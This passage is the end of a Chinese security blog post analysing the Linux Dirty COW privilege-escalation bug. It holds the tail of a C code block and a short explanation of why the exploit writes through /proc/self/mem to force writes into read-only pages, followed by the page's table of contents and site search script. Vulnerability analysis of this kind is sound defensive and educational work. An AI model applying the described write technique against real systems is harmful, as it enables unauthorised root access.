class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
+
+
+
+        <h2 id="问题讨论"   >
+          <a href="#问题讨论" class="heading-link"><i class="fas fa-link"></i></a><a href="#问题讨论" class="headerlink" title="问题讨论"></a>问题讨论</h2>
+      <ul>
+<li><p>为什么不直接对mmap的页用write写，而是使用/proc/self/mem？</p>
+<p>我的理解：因为对<code>/proc/self/mem</code>写入时，内核空间处理有调用kmap函数，映射目标物理页面到内核，对目标页面读写。即使是用户不可写的内存区域，也可强制写入。而write或memcpy函数对应的内核处理流程中，如果发现往只读内存写，就会产生segmentation fault。</p>
+</li>
+</ul>
+</div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ 本文结束，感谢您的阅读 ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">本文作者: </span><span class="copyright-author__value"><a href="http://blingblingxuanxuan.github.io">blingbling</a></span></div><div class="copyright-link"><span class="copyright-link__name">本文链接: </span><span class="copyright-link__value"><a href="http://blingblingxuanxuan.github.io/2023/05/02/230501-dirtycow-analysis/">http://blingblingxuanxuan.github.io/2023/05/02/230501-dirtycow-analysis/</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">版权声明: </span><span class="copyright-notice__value">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" rel="external nofollow" target="_blank">BY-NC-SA</a> 许可协议。转载请注明出处！</span></div></div><div class="post-share"><div class="social-share" data-sites="qzone, qq, weibo, wechat, douban, linkedin, facebook, twitter, google">Share to: </div></div><nav class="post-paginator paginator"><div class="paginator-prev"><a class="paginator-prev__link" href="/2023/05/02/230501-dirtycow-to-root/"><span class="paginator-prev__icon"><i class="fas fa-angle-left"></i></span><span class="paginator-prev__text">230501-dirtycow-to-root</span></a></div><div class="paginator-next"><a class="paginator-next__link" href="/2023/04/01/230401-n1ctf2022-pwn-praymoon/"><span class="paginator-prev__text">N1CTF2022 praymoon</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">文章目录</span><span class="sidebar-nav-ov">站点概览</span></div><section class="sidebar-toc"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#dirtycow%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">1.</span> <span class="toc-text">
+          dirtycow漏洞分析</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#exp%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">
+          exp分析</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%B0%83%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90"><span class="toc-number">3.</span> <span class="toc-text">
+          调用链分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E6%AC%A1"><span class="toc-number">3.1.</span> <span class="toc-text">
+          第一次</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E6%AC%A1"><span class="toc-number">3.2.</span> <span class="toc-text">
+          第二次</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E6%AC%A1"><span class="toc-number">3.3.</span> <span class="toc-text">
+          第三次</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E5%9B%9B%E6%AC%A1"><span class="toc-number">3.4.</span> <span class="toc-text">
+          第四次</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%80%E7%BB%88"><span class="toc-number">3.5.</span> <span class="toc-text">
+          最终</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">3.6.</span> <span class="toc-text">
+          总结</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B0%E7%8E%AF%E5%A2%83"><span class="toc-number">4.</span> <span class="toc-text">
+          复现环境</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D"><span class="toc-number">5.</span> <span class="toc-text">
+          漏洞修复</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="toc-number">6.</span> <span class="toc-text">
+          参考资料</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="toc-number">7.</span> <span class="toc-text">
+          知识点</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#copy-on-write%E6%9C%BA%E5%88%B6"><span class="toc-number">7.1.</span> <span class="toc-text">
+          copy-on-write机制</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#mmap"><span class="toc-number">7.2.</span> <span class="toc-text">
+          mmap</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#madvise"><span class="toc-number">7.3.</span> <span class="toc-text">
+          madvise</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#proc-self-mem%E6%96%87%E4%BB%B6"><span class="toc-number">7.4.</span> <span class="toc-text">
+          &#x2F;proc&#x2F;self&#x2F;mem文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%97%AE%E9%A2%98%E8%AE%A8%E8%AE%BA"><span class="toc-number">7.5.</span> <span class="toc-text">
+          问题讨论</span></a></li></ol></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/uploads/zhishi1.jpg" alt="avatar"></div></div><div class="sidebar-ov-social"><a class="sidebar-ov-social-item" href="https://github.com/blingblingxuanxuan" target="_blank" rel="noopener" data-popover="Github" data-popover-pos="up"><span class="sidebar-ov-social-item__icon"><i class="fab fa-github"></i></span></a></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">62</div><div class="sidebar-ov-state-item__name">归档</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--categories" href="/categories/"><div class="sidebar-ov-state-item__count">12</div><div class="sidebar-ov-state-item__name">分类</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--tags" href="/tags/"><div class="sidebar-ov-state-item__count">34</div><div class="sidebar-ov-state-item__name">标签</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="知识共享许可协议" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">你已阅读了 </span><span class="sidebar-reading-info__num">0</span><span class="sidebar-reading-info__perc">%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2023</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>blingbling</span></div><div><span>由 <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> 强力驱动</span><span> v5.3.0</span><span class="footer__devider">|</span><span>主题 - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.6.2</span></div><div class="busuanzi"><span class="busuanzi-siteuv"><span class="busuanzi-siteuv__icon" data-popover-pos="up" data-popover="访问人数"><i class="fas fa-user"></i></span><span class="busuanzi-siteuv__value" id="busuanzi_value_site_uv"></span></span><span class="busuanzi-sitepv"><span class="busuanzi-siteuv__icon" data-popover-pos="up" data-popover="浏览总量"><i class="fas fa-eye"></i></span><span class="busuanzi-siteuv__value" id="busuanzi_value_site_pv"></span></span></div><div>Just follow your heart, and keep smiling.</div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><div class="search-mask"></div><div class="search-popup"><span class="search-close"></span><div class="search-input"><input placeholder="搜索文章（支持多关键词，请用空格分隔）"></div><div class="search-results"></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="https://cdn.jsdelivr.net/npm/canvas-nest.js@1.0.1/dist/canvas-nest.min.js" color="0,0,0" opacity="0.6" count="99" zIndex="-1"></script><script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/social-share.js@1.0.16/dist/js/social-share.min.js"></script><script>function initSearch() {
+  var isXML = true;
+  var search_path = 'search.json';
+
+  if (!search_path) {
+    search_path = 'search.xml';
+  } else if (/json$/i.test(search_path)) {
+    isXML = false;
+  }
+
+  var path = '/' + search_path;
+  $.ajax({
+    url: path,
+    dataType: isXML ? 'xml' : 'json',
+    async: true,
+    success: function (res) {
+      var datas = isXML ? $('entry', res).map(function () {
+        // 将 XML 转为 JSON
+        return {
+          title: $('title', this).text(),
+          content: $('content', this).text(),
+          url: $('url', this).text()
+        };
+      }).get() : res;
+      var $input = $('.search-input input');
+      var $result = $('.search-results');
+      // 搜索对象（标题、内容）的权重，影响显示顺序
+      var WEIGHT = { title: 100, content: 1 };
+      var searchPost = function () {
+        var searchText = $input.val().toLowerCase().trim();
+        // 根据空白字符分隔关键字
+        var keywords = searchText.split(/[\s]+/);
+        // 搜索结果
+        var matchPosts = [];
+
+        // 有多个关键字时，将原文字整个保存下来
+        if (keywords.length > 1) {
+          keywords.push(searchText);
+        }
+        // 防止未输入字符时搜索
+        if (searchText.length > 0) {
+          datas.forEach(function (data) {
+            var isMatch  = false;
+            // 没有标题的文章使用预设的 i18n 变量代替
+            var title = (data.title && data.title.trim()) || '[ 文章无标题 ]';
+            var titleLower = title && title.toLowerCase();
+            // 删除 HTML 标签 和 所有空白字符
+            var content = data.content && data.content.replace(/<[^>]+>/g, '');
+            var contentLower = content && content.toLowerCase();
+            // 删除重复的 /
+            var postURL = data.url && decodeURI(data.url).replace(/\/{2,}/g, '/');
+            // 标题中匹配到的关键词
+            var titleHitSlice = [];
+            // 内容中匹配到的关键词
+            var contentHitSlice = [];
+
+            keywords.forEach(function (keyword) {
+              /**
+              * 获取匹配的关键词的索引
+              * @param {String} keyword 要匹配的关键字
+              * @param {String} text 原文字
+              * @param {Boolean} caseSensitive 是否区分大小写
+              * @param {Number} weight 匹配对象的权重。权重大的优先显示
+              * @return {Array}
+              */
+              function getIndexByword (word, text, caseSensitive, weight) {
+                if (!word || !text) {
+                  return [];
+                };
+
+                var startIndex = 0; // 每次匹配的开始索引
+                var index = -1;     // 匹配到的索引值
+                var result = [];    // 匹配结果
+
+                if (!caseSensitive) {
+                  word = word.toLowerCase();
+                  text = text.toLowerCase();
+                }
+
+                while((index = text.indexOf(word, startIndex)) !== -1) {
+                  var hasMatch = false;
+                  // 索引位置相同的关键词，保留长度较长的
+                  titleHitSlice.forEach(function (hit) {
+                    if (hit.index === index && hit.word.length < word.length) {
+                      hit.word = word;
+                      hasMatch = true;
+                    }
+                  });
+                  startIndex = index + word.length;
+                  !hasMatch && result.push({ index: index, word: word, weight: weight });
+                }
+                return result;
+              }
+              titleHitSlice = titleHitSlice.concat(getIndexByword(keyword, titleLower, false, WEIGHT.title));
+              contentHitSlice = contentHitSlice.concat(getIndexByword(keyword, contentLower, false, WEIGHT.content));
+            });
+
+            var hitTitle = titleHitSlice.length;
+            var hitContent = contentHitSlice.length;
+
+            if (hitTitle > 0 || hitContent > 0) {
+              isMatch = true;
+            }
+            if (isMatch) {
+              ;[titleHitSlice, contentHitSlice].forEach(function (hit) {
+                // 按照匹配文字的索引的递增顺序排序
+                hit.sort(function (left, right) {
+                  return left.index - right.index;
+                });
+              });
+              /**
+              * 给文本中匹配到的关键词添加标记，从而进行高亮显示
+              * @param {String} text 原文本
+              * @param {Array} hitSlice 匹配项的索引信息
+              * @param {Number} start 开始索引
+              * @param {Number} end 结束索引
+              * @return {String}
+              */
+              function highlightKeyword (text, hitSlice, start, end) {
+                if (!text || !hitSlice || !hitSlice.length) {
+                  return;
+                }
+
+                var result = '';
+                var startIndex = start;
+                var endIndex = end;
+                hitSlice.forEach(function (hit) {
+                  if (hit.index < startIndex) {
+                    return;
+                  }
+
+                  var hitWordEnd = hit.index + hit.word.length;
+                  result += text.slice(startIndex, hit.index);
+                  result += '<b>' + text.slice(hit.index, hitWordEnd) + '</b>';
+                  startIndex = hitWordEnd;
+                });
+                result += text.slice(startIndex, endIndex);
+                return result;
+              }
+
+              var postData = {};
+              // 文章总的搜索权重
+              var postWeight = titleHitSlice.length * WEIGHT.title + contentHitSlice.length * WEIGHT.content;
+              // 标记匹配关键词后的标题
+              var postTitle = highlightKeyword(title, titleHitSlice, 0, title.length) || title;
+              // 标记匹配关键词后的内容
+              var postContent;
+              // 显示内容的长度
+              var SHOW_WORD_LENGTH = 200;
+              // 命中关键词前的字符显示长度
+              var SHOW_WORD_FRONT_LENGTH = 20;
+              var SHOW_WORD_END_LENGTH = SHOW_WORD_LENGTH - SHOW_WORD_FRONT_LENGTH;
+
+              // 截取匹配的第一个字符，前后共 200 个字符来显示
+              if (contentHitSlice.length > 0) {
+                var firstIndex = contentHitSlice[0].index;
+                var start = firstIndex > SHOW_WORD_FRONT_LENGTH ? firstIndex - SHOW_WORD_FRONT_LENGTH : 0;
+                var end = firstIndex + SHOW_WORD_END_LENGTH;
+                postContent = highlightKeyword(content, contentHitSlice, start, end);
+              } else { // 未匹配到内容，直接截取前 200 个字符来显示
+                postContent = content.slice(0, SHOW_WORD_LENGTH);
+              }
+              postData.title = postTitle;
+              postData.content = postContent;
+              postData.url = postURL;
+              postData.weight = postWeight;
+              matchPosts.push(postData);
+            }
+          });
+        }
+
+        var resultInnerHtml = '';
+        if (matchPosts.length) {
+          // 按权重递增的顺序排序，使权重大的优先显示
+          matchPosts.sort(function (left, right) {
+            return right.weight - left.weight;
+          });
+          resultInnerHtml += '<ul>';
+          matchPosts.forEach(function (post) {
+            resultInnerHtml += '<li><a class="search-results-title" href="' + post.url + '">';
+            resultInnerHtml += post.title;
+            resultInnerHtml += '</a><div class="search-results-content">';
+            resultInnerHtml += post.content;
+            resultInnerHtml += '</div></li>';
+          });
+          resultInnerHtml += '</ul>';
+        } else {
+          resultInnerHtml += '<div class="search-results-none"><i class="far fa-meh"></i></div>';
+        }
+        $result.html(resultInnerHtml);
+      };
+      $input.on('input', searchPost);
+      $input.on('keyup', function (e) {
+        if (e.keyCode === Stun.utils.codeToKeyCode('Enter')) {
+          searchPost();
+        }
+      });
+    }
+  });
+}
+
+function closeSearch () {
+  $('body').css({ overflow: 'auto' });
+  $('.search-popup').css({ display: 'none' });
+  $('.search-mask').css({ display: 'none' });
+}
+
+window.addEventListener('DOMContentLoaded', function () {
+  Stun.utils.pjaxReloadLocalSearch = function () {
+    $('.header-nav-search').on('click', function (e) {
+      e.stopPropagation();
+      $('body').css('overflow', 'hidden');
+      $('.search-popup')
+        .velocity('stop')
+        .velocity('transition.expandIn', {
+          duration: 300,
+          complete: function () {
+            $('.search-popup input').focus();
+          }
+        });
+      $('.search-mask')
+        .velocity('stop')
+        .velocity('transition.fadeIn', {
+          duration: 300
+        });
+
+      initSearch();
+    });
+    $('.search-mask, .search-close').on('click', function () {
+      closeSearch();
+    });
+    $(document).on('keydown', function (e) {
+      // Escape <=> 27
+      if (e.keyCode === Stun.utils.codeToKeyCode('Escape')) {
+        closeSearch();
+      }
+    });
+  };
+
+  Stun.utils.pjaxReloadLocalSearch();
+}, false);
+
+function safeOpenUrl(url) {
+  var newTab = window.open();
+  newTab.opener = null;
+  newTab.location = url;
+}
+
+function extSearch(engine) {
+  var engines = {
+    google: 'https://www.google.com/search?q=',
+    bing: 'https://cn.bing.com/search?q=',
+    baidu: 'https://www.baidu.com/s?ie=UTF-8&wd=',
+  };
+  var host = window.location.host;
+  var query = $('.search-input input').val().toLowerCase().trim();
+  var uri = engines[engine] + query + ' site:' + host;
+
+  if (query) {
+    safeOpenUrl(uri);
+  } else {
+    Stun.utils.popAlert('warning', '请输入字符');
+  }
+}
+
+var assistSearchList = window.CONFIG.assistSearch;
+
+if (Array.isArray(assistSearchList)) {
+  assistSearchList.forEach(function (name) {
+    document.querySelector('.search-btns-item--' + name).addEventListener('click', function () {
+      extSearch(name);
+    }, false);
+  });
+}</script><script src="https://cdn.jsdelivr.net/gh/sukkaw/busuanzi@latest/bsz.pure.mini.js" async></script><script src="/js/utils.js?v=2.6.2"></script><script src="/js/stun-boot.js?v=2.6.2"></script><script src="/js/scroll.js?v=2.6.2"></script><script src="/js/header.js?v=2.6.2"></script><script src="/js/sidebar.js?v=2.6.2"></script><script type="application/json" src="/search.json"></script></body></html>
